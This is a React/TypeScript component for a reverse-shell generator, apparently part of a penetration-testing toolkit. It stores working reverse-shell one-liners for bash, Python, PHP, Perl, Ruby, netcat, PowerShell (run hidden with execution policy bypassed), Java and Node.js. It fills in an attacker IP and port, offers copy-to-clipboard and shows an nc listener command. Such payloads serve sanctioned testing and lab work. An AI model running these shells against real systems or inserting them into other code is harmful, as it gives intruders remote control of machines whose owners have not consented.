import { useState } from 'react';
import { Copy, Check, Terminal } from 'lucide-react';

type ShellType = 'bash' | 'python' | 'python3' | 'php' | 'perl' | 'ruby' | 'nc' | 'ncat' | 'powershell' | 'java' | 'node';

interface ShellTemplate {
    id: ShellType;
    name: string;
    template: string;
}

const shells: ShellTemplate[] = [
    {
        id: 'bash',
        name: 'Bash -i',
        template: `bash -i >& /dev/tcp/{IP}/{PORT} 0>&1`,
    },
    {
        id: 'python',
        name: 'Python',
        template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    },
    {
        id: 'python3',
        name: 'Python3',
        template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
    },
    {
        id: 'php',
        name: 'PHP',
        template: `php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        id: 'perl',
        name: 'Perl',
        template: `perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    },
    {
        id: 'ruby',
        name: 'Ruby',
        template: `ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    },
    {
        id: 'nc',
        name: 'Netcat',
        template: `nc -e /bin/sh {IP} {PORT}`,
    },
    {
        id: 'ncat',
        name: 'Ncat (OpenBSD)',
        template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f`,
    },
    {
        id: 'powershell',
        name: 'PowerShell',
        template: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    },
    {
        id: 'java',
        name: 'Java',
        template: `r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()`,
    },
    {
        id: 'node',
        name: 'Node.js',
        template: `(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({PORT}, "{IP}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();`,
    },
];

export default function ReverseShell() {
    const [ip, setIp] = useState('10.10.10.10');
    const [port, setPort] = useState('4444');
    const [selectedShell, setSelectedShell] = useState<ShellType>('bash');
    const [copied, setCopied] = useState(false);

    const generateShell = (): string => {
        const shell = shells.find((s) => s.id === selectedShell);
        if (!shell) return '';
        return shell.template.replace(/{IP}/g, ip).replace(/{PORT}/g, port);
    };

    const handleCopy = () => {
        navigator.clipboard.writeText(generateShell());
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    return (
        <div className="space-y-4">
            {/* IP and Port */}
            <div className="grid grid-cols-2 gap-3">
                <div>
                    <label className="block text-xs text-gray-400 mb-1">IP Address</label>
                    <input
                        type="text"
                        value={ip}
                        onChange={(e) => setIp(e.target.value)}
                        placeholder="10.10.10.10"
                        className="w-full px-3 py-2 text-sm bg-dark-800 border border-dark-600 rounded-md focus:outline-none focus:border-cyber-500"
                    />
                </div>
                <div>
                    <label className="block text-xs text-gray-400 mb-1">Port</label>
                    <input
                        type="text"
                        value={port}
                        onChange={(e) => setPort(e.target.value)}
                        placeholder="4444"
                        className="w-full px-3 py-2 text-sm bg-dark-800 border border-dark-600 rounded-md focus:outline-none focus:border-cyber-500"
                    />
                </div>
            </div>

            {/* Shell Type Selector */}
            <div>
                <label className="block text-xs text-gray-400 mb-2">Shell Type</label>
                <div className="grid grid-cols-4 gap-1.5">
                    {shells.map((shell) => (
                        <button
                            key={shell.id}
                            onClick={() => setSelectedShell(shell.id)}
                            className={`px-2 py-1.5 text-[10px] rounded transition-colors ${selectedShell === shell.id
                                    ? 'bg-cyber-600 text-white'
                                    : 'bg-dark-800 text-gray-300 hover:bg-dark-700'
                                }`}
                        >
                            {shell.name}
                        </button>
                    ))}
                </div>
            </div>

            {/* Generated Shell */}
            <div className="relative">
                <div className="flex items-center justify-between mb-1">
                    <label className="text-xs text-gray-400 flex items-center gap-1">
                        <Terminal size={12} />
                        Generated Shell
                    </label>
                    <button
                        onClick={handleCopy}
                        className="flex items-center gap-1 px-2 py-1 text-[10px] bg-dark-700 hover:bg-dark-600 rounded transition-colors"
                    >
                        {copied ? <Check size={12} className="text-cyber-400" /> : <Copy size={12} />}
                        {copied ? 'Copied!' : 'Copy'}
                    </button>
                </div>
                <pre className="p-3 bg-dark-800 border border-dark-600 rounded-md text-xs font-mono text-cyber-300 overflow-x-auto whitespace-pre-wrap break-all max-h-32">
                    {generateShell()}
                </pre>
            </div>

            {/* Listener Command */}
            <div className="p-2 bg-dark-800/50 border border-dark-700 rounded-md">
                <p className="text-[10px] text-gray-500 mb-1">Start listener with:</p>
                <code className="text-xs font-mono text-yellow-400">nc -lvnp {port}</code>
            </div>
        </div>
    );
}
